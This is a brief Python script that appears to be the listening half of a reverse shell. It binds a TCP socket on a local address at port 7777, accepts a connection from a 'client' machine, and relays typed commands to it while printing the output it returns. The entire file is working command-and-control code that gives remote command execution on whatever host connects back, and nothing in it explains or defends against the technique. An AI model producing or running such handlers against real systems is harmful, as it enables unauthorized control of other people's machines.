#!/usr/bin/python

import socket

def shell():
    while True:
        cmd = input("# ")
        target.send(cmd.encode('utf-8')) # send command to client
        if cmd == "exit":
            break
        output = target.recv(1024) #receive output from client
        print(output.decode('utf-8'))

def server():
    global s
    global ip
    global target
    #creating socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET for IPv4 connexion and SOCK_STREAM for TCP connection
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #binding socket to local IP and port
    s.bind(("192.168.92.128", 7777)) #listening on port 7777
    s.listen(5) #max connections allowed on server
    print("Listening to incoming connections")
    target, ip = s.accept()
    print(f"connection established from:{ip}")

server()
shell()